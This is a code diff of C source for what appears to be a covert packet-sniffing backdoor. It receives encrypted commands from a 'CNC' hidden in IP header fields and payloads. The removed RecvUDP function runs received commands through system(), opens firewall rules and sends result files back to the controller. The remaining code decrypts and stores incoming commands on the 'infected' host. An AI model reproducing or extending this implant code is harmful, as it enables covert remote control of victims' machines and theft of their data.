@@ -43,72 +43,6 @@ void ReadPacket(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* pa
     }
 }
 
-void RecvUDP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet){
-    struct filter* Filter = NULL;
-    Filter = (struct filter *)args;
-    const struct my_ip* ip;
-    u_int length = pkthdr->len;
-    u_int hlen,off,version;
-    int len;
-
-    ip = (struct my_ip*)(packet + sizeof(struct ether_header));
-    length-= sizeof(struct ether_header);
-
-    if(length < sizeof(struct my_ip)){
-        printf("Packet length is incorrect %d", length);
-        exit(1);
-    }
-    len = ntohs(ip->ip_len);
-    hlen = IP_HL(ip);
-    version = IP_V(ip);
-    off = ntohs(ip->ip_off);
-
-    //if the packet is the wrong version and size exit
-    if(version != 4){
-        perror("Unknown error");
-        exit(1);
-    } else if(hlen < 5){
-        perror("Bad header length");
-        exit(1);
-    } else if((int)length < len){
-        perror("Truncated IP");
-        exit(1);
-    }
-
-    if(ip->ip_p == IPPROTO_UDP){
-
-        if(CheckKey(ip->ip_tos, ip->ip_id) == COMMAND){
-            //only CNC will get into this loop
-            //port knocking packet
-            if(Filter->infected == false){
-                //PortKnocking(Filter, pkthdr, packet, false, false);
-            }
-        } else if(ip->ip_id == 'r' && ip->ip_tos == 'r' && ip->ip_ttl == 'r'){
-            if(Filter->infected){
-                recv_results(Filter->localip, UPORT, FILENAME, false);
-                system(CHMOD);
-                system(CMD);
-                //open outbound rule
-                iptables(Filter->targetip, false, PORT, false, false);
-                printf("COMMAND RECEIEVED \n");
-                //sending the results back to the CNC
-                unsigned char *buf = 0;
-                //PortKnocking(Filter, pkthdr, packet, true, false);
-                //covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[0], Filter->port_short[0], buf, 2);
-                //covert_udp_send(Filter->localip,Filter->targetip, Filter->port_short[1], Filter->port_short[1], buf, 2);
-                printf("SENDING RESULTS\n");
-                send_results(Filter->localip, Filter->targetip, UPORT, UPORT, RESULT_FILE, false);
-                iptables(Filter->targetip, false, PORT, false, true);
-                printf("\n");
-                printf("\n");
-                printf("Waiting for new command\n");
-            }
-        } else {
-            printf("Wrong key tossing packet\n");
-        }
-    }
-}
-
 void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_char* packet){
     const struct my_ip* ip;
     u_int length = pkthdr->len;
@@ -172,13 +106,9 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     //infected machine receiving a command
     } else if(Filter->infected == true) {
         struct in_addr src;
-        unsigned char decryptedtext[BUFSIZE+16];        //used for command inotify
-        int decryptedlen, cipherlen;                    //used for command inotify
 
         switch(CheckKey(ip->ip_tos, ip->ip_id)) {
             case COMMAND:
-                //write command to .cmd
-
                 if(Filter->tcp == false) {
                     if((fp = fopen(FILENAME, "ab+")) < 0){
                         perror("fopen");
@@ -204,10 +134,10 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
                     }
 
                     //because safety
-                    char buf[BUFSIZE + 16];
+                    unsigned char buf[BUFSIZE + 16];
                     strncpy(buf, ParseTCPPayload(packet), sizeof(buf));
 
-                    if((fwrite(buf, strlen((const char*)decryptedtext), sizeof(char), fp)) <= 0){
+                    if((fwrite(buf, strlen((const char*)buf), sizeof(char), fp)) <= 0){
                         perror("fwrite");
                         exit(1);
                     }
@@ -253,15 +183,14 @@ void ParseIP(struct filter *Filter, const struct pcap_pkthdr* pkthdr, const u_ch
     fclose(fp);
 }
 
-char *ParseTCPPayload(const u_char* packet) {
+const unsigned char *ParseTCPPayload(const u_char* packet) {
     const struct sniff_tcp *tcp=0;
     const struct my_ip *ip;
-    const char *payload;
+    unsigned char *payload;
     int size_ip;
     int size_tcp;
-    int size_payload;
-    unsigned char decryptedtext[BUFSIZE+16];
-    int decryptedlen, cipherlen;
+
+    unsigned char *decryptedtext = malloc(BUFSIZE + 16);
 
     ip = (struct my_ip*)(packet + 14);
     size_ip = IP_HL(ip)*4;
@@ -274,9 +203,7 @@ char *ParseTCPPayload(const u_char* packet) {
         exit(1);
     }
     payload = (u_char *)(packet + 14 + size_ip + size_tcp);
-    size_payload = ntohs(ip->ip_len) - (size_ip + size_tcp);
-    cipherlen = strlen((char*)payload);
-    decryptedlen = decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);
+    decryptMessage((unsigned char*)payload, BUFSIZE+16, (unsigned char*)KEY, (unsigned char *)IV, decryptedtext);
 
     return decryptedtext;
 }
@@ -390,7 +317,7 @@ void ParsePayload(struct filter *Filter, const u_char *payload, int len, bool tc
     }
 }
 
-struct filter InitFilter(char *target, char *local, bool infected, bool tcp, ){
+struct filter InitFilter(char *target, char *local, bool infected, bool tcp){
     struct filter Filter;
 
     Filter.infected = infected;
